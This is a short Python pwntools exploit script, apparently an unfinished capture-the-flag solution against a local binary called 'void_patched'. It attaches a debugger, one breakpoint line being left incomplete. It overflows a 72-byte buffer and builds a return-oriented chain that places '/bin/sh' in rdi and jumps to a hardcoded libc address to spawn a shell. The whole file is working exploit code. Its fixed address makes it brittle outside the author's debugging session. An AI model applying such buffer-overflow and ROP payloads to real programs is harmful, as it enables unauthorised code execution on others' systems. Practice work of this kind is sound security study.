from pwn import *

r = process("./void_patched")
libc = ELF("./libc.so.6")
exe = ELF("./void_patched")
gdb.attach(r, gdbscript='''
           b*vuln+30
           b*
           ''')
input()
pop_rdi = 0x00000000004011bb
pop_rsi = 0x00000000004011b9
rw_section = 0x404170
payload = b"/bin/sh\0"
payload = payload.ljust(72)
payload += p64(pop_rdi) + p64(next(exe.search(b'/bin/sh')))
payload += p64(0x7f819d41ce50)
log.info("/bin/sh adr: " + hex(next(exe.search(b'/bin/sh'))))
r.sendline(payload)


r.interactive()
